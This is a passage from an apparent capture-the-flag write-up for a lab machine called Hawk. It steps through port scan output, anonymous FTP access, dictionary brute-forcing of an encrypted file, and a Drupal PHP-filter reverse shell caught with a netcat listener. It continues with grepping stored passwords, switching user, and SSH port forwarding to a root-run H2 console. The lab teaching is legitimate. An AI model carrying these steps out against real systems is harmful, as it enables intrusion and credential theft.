80/tcp   open  http    syn-ack Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin/
| /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;comment/reply/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;filter/tips/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;node/add/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;search/
|_/?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/password/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/register/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/login/ /?q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user/logout/
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    syn-ack H2 database http console
|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
| http-methods:
|_  Supported Methods: GET POST
|_http-title: H2 Console
Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Very interesting results! We have an &lt;strong&gt;FTP server allowing anonymous login&lt;/strong&gt;, an &lt;strong&gt;SSH server&lt;/strong&gt;, an &lt;strong&gt;Apache web server&lt;/strong&gt; running &lt;strong&gt;Drupal 7 CMS&lt;/strong&gt; and a &lt;strong&gt;H2 database console&lt;/strong&gt;. Let’s dig into all of this!&lt;/p&gt;

&lt;h3 id=&quot;ftp-anonymous-login&quot;&gt;FTP Anonymous Login&lt;/h3&gt;

&lt;p&gt;We can connect to the ftp server using the name &lt;em&gt;anonymous&lt;/em&gt; without password. While exploring the only available directory, we have found a hidden file named &lt;em&gt;.drupal.txt.enc&lt;/em&gt;, that we have downloaded.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 10.10.10.102
Connected to 10.10.10.102.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.102:boiteaklou&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;messages
250 Directory successfully changed.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
226 Directory send OK.
ftp&amp;gt; get .drupal.txt.enc
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; .drupal.txt.enc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;240 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
240 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.3842 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;salted-openssl-decryption&quot;&gt;Salted OpenSSL Decryption&lt;/h3&gt;

&lt;p&gt;As its suffix suggests it, this file is &lt;strong&gt;encrypted&lt;/strong&gt;. We can verify that using the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; program.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file .drupal.txt.enc
.drupal.txt.enc: openssl enc&lt;span class=&quot;s1&quot;&gt;'d data with salted password, base64 encoded
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It is also &lt;strong&gt;base64 encoded&lt;/strong&gt; so we decode it using the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .drupal.txt.enc | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; drupal.txt.enc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a bit of research, I found a tool on &lt;a href=&quot;https://github.com/glv2/bruteforce-salted-openssl&quot;&gt;github&lt;/a&gt; called &lt;em&gt;bruteforce-salted-openssl&lt;/em&gt; which revealed itself very effective.
I used it with the classical &lt;em&gt;rockyou.txt&lt;/em&gt; wordlist:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bruteforce-salted-openssl &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 8 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; rockyou.txt &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 30 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; SHA256 drupal.txt.enc
Warning: using dictionary mode, ignoring options &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;, &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; and &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Tried passwords: 29
Tried passwords per second: inf
Last tried password: 1234567890

Password candidate: friends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span style=&quot;color:Green&quot;&gt;Perfect! We have the password.&lt;/span&gt; We can now use &lt;strong&gt;OpenSSL&lt;/strong&gt; to decipher the file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl enc &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-aes-256-cbc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pass&lt;/span&gt; pass:friends &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; drupal.txt.enc
Daniel,

Following the password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the portal:

PencilKeyboardScanner123

Please &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;us know when the portal is ready.

Kind Regards,

IT department
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It looks like we’ve found credentials for a certain portal.&lt;/p&gt;

&lt;h3 id=&quot;drupal-reverse-shell-upload&quot;&gt;Drupal Reverse Shell Upload&lt;/h3&gt;

&lt;p&gt;Drupal is an Open-Source Content Management System.&lt;/p&gt;

&lt;p&gt;Browsing to &lt;a href=&quot;http://10.10.10.102:80&quot;&gt;http://10.10.10.102:80&lt;/a&gt;, we are facing a login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-login.png&quot; alt=&quot;Drupal login&quot; title=&quot;Drupal login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Trying a couple common usernames, we quickly found out that &lt;strong&gt;“admin”&lt;/strong&gt; was the right one to combine with the password we just deciphered.&lt;/p&gt;

&lt;p&gt;Once logged in, all we have to do is to &lt;span style=&quot;color:Red&quot;&gt;enable phpfilters&lt;/span&gt; and to &lt;span style=&quot;color:Red&quot;&gt;create a new article with our php reverse shell payload inside.&lt;/span&gt; I’ll detail all these steps right below.&lt;/p&gt;

&lt;p&gt;First of all, we have to &lt;span style=&quot;color:DarkOrchid&quot;&gt;setup a local listener&lt;/span&gt; for our reverse shell:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we have to &lt;span style=&quot;color:Red&quot;&gt;enable phpfilters in order to be able to execute PHP code inside articles.&lt;/span&gt; Once logged in as admin, go to &lt;strong&gt;Configuration &amp;gt; Content Authoring &amp;gt; Text formats&lt;/strong&gt; and tick &lt;strong&gt;“PHP Evaluator”&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-phpfilter.png&quot; alt=&quot;Drupal phpfilter&quot; title=&quot;Drupal phpfilter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we can add a new article and place our &lt;strong&gt;PHP reverse shell payload&lt;/strong&gt; inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-add-article.png&quot; alt=&quot;Drupal add article&quot; title=&quot;Drupal add article&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, don’t forget to &lt;span style=&quot;color:Red&quot;&gt;set the text format of the article to “PHP Code”&lt;/span&gt; at the bottom the page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/drupal-textformat.png&quot; alt=&quot;Drupal textformat&quot; title=&quot;Drupal text-format&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The reverse shell should be coming back to our machine now:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.20] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.102] 38992
/bin/sh: 0: can t access tty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; job control turned off
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Very nice! Being connected as &lt;strong&gt;www-data&lt;/strong&gt; is not enough for the user flag unfortunately. &lt;span style=&quot;color:MediumSlateBlue&quot;&gt;We must find a way to connect as a real user!&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&quot;stored-credentials-retrieval&quot;&gt;Stored credentials retrieval&lt;/h3&gt;

&lt;p&gt;First, let’s &lt;span style=&quot;color:Green&quot;&gt;upgrade this horrible shell to a bash&lt;/span&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@hawk:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a bit of digging, I found what seems to be &lt;strong&gt;a plaintext password&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Ri&lt;/span&gt; password
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
sites/default/settings.php:      &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'drupal4hawk'&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Having a look at &lt;em&gt;/home/&lt;/em&gt;, we can see that &lt;em&gt;daniel&lt;/em&gt; is our potential target. Let’s see if we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; as &lt;em&gt;daniel&lt;/em&gt; with this password:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hawk:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su daniel
su daniel
Password: drupal4hawk

Python 3.6.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Apr  1 2018, 05:46:30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 7.3.0] on linux
Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It’s working but &lt;span style=&quot;color:Red&quot;&gt;we’re popping inside a python shell!&lt;/span&gt; Surprising, even though it shouldn’t be too difficult to escape.&lt;/p&gt;

&lt;h3 id=&quot;python-shell-escape&quot;&gt;Python Shell Escape&lt;/h3&gt;

&lt;p&gt;Actually, we can use the same technique we used to upgrade from &lt;strong&gt;/bin/sh&lt;/strong&gt; to &lt;strong&gt;/bin/bash&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Python 3.6.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Apr  1 2018, 05:46:30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 7.3.0] on linux
Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import pty
import pty
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
daniel@hawk:/var/www/html&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nothing prevents us to get the user flag anymore!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daniel@hawk:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/daniel/user.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/daniel/user.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;As we’ve seen during our recon, an SSH server is running and we can use to directly login as daniel. A nice checkpoint allowed by the author of the box :wink:.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;elevating-privileges&quot;&gt;Elevating privileges&lt;/h2&gt;

&lt;p&gt;We are now connected as &lt;em&gt;daniel&lt;/em&gt; via &lt;strong&gt;SSH&lt;/strong&gt;. We can start the &lt;strong&gt;enumeration process&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;When looking for a way to escalate privileges on machine, I like to run a tool like &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum.sh&lt;/a&gt; in the background while I fuzz the machine manually.&lt;/p&gt;

&lt;p&gt;Do you remember the &lt;strong&gt;H2 Database console&lt;/strong&gt; we saw with the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan? &lt;span style=&quot;color:Red&quot;&gt;It is running as root on Hawk…&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daniel@hawk:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; |grep h2
root        801  0.0  0.0   4628   808 ?        Ss   Nov30   0:00 /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/bin/java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; /opt/h2/bin/h2-1.4.196.jar
root        802  0.0  5.7 2345696 56448 ?       Sl   Nov30   1:28 /usr/bin/java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; /opt/h2/bin/h2-1.4.196.jar
daniel    21347  0.0  0.1  13136  1012 pts/2    S+   18:57   0:00 &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;h2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Are you thinking what I am thinking?&lt;/p&gt;

&lt;p&gt;When trying to access it in a web browser, it says: &lt;span style=&quot;color:Maroon&quot;&gt;&lt;em&gt;“Sorry, remote connections (‘webAllowOthers’) are disabled on this server.”&lt;/em&gt;&lt;/span&gt; :cry:&lt;/p&gt;

&lt;h3 id=&quot;ssh-port-forwarding&quot;&gt;SSH Port Forwarding&lt;/h3&gt;

&lt;p&gt;Now that we have a foot in the system, we can &lt;span style=&quot;color:Green&quot;&gt;initiate connections from the machine itself&lt;/span&gt;. Let’s verify this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daniel@hawk:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://127.0.0.1:8082
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Copyright 2004-2014 H2 Group. Multiple-Licensed under the MPL 2.0,
and the EPL 1.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://h2database.com/html/license.html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Initial Developer: H2 Group
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
    &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/html;charset=utf-8&quot;&lt;/span&gt; /&amp;gt;
    &amp;lt;title&amp;gt;H2 Console&amp;lt;/title&amp;gt;
    &amp;lt;link &lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet.css&quot;&lt;/span&gt; /&amp;gt;
&amp;lt;script &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
location.href &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'login.jsp?jsessionid=c48d2804eb930787aff2325b9aba37dd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;margin: 20px;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

&amp;lt;h1&amp;gt;Welcome to H2&amp;lt;/h1&amp;gt;
&amp;lt;h2&amp;gt;No Javascript&amp;lt;/h2&amp;gt;
If you are not automatically redirected to the login page, &lt;span class=&quot;k&quot;&gt;then
&lt;/span&gt;Javascript is currently disabled or your browser does not support Javascript.
For this application to work, Javascript is essential.
Please &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;Javascript now, or use another web browser that supports it.

&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span style=&quot;color:Green&quot;&gt;Seems allowed when executed from the localhost!&lt;/span&gt; However, we don’t have access to a web browser on Hawk. This is why we need to use SSH port forwarding as follows: &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L 9000:localhost:8082 daniel@10.10.10.102&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The english version is: “&lt;strong&gt;Forward&lt;/strong&gt; everything I send to port &lt;strong&gt;127.0.0.1:9000&lt;/strong&gt; to &lt;strong&gt;10.10.102:8082&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color:Red&quot;&gt;Now, we should be able to access the H2 database console from our own web browser.&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&quot;h2-database-console&quot;&gt;H2 Database Console&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-db.png&quot; alt=&quot;H2 Database&quot; title=&quot;H2 database&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When trying to connect to the &lt;strong&gt;default database&lt;/strong&gt; with &lt;strong&gt;default credentials&lt;/strong&gt;, it returns an error. &lt;span style=&quot;color:Green&quot;&gt;But what if we try to connect to a new database?&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-01/h2-boiteaklou.png&quot; alt=&quot;H2 New db&quot; title=&quot;H2 New db&quot; /&gt;&lt;/p&gt;

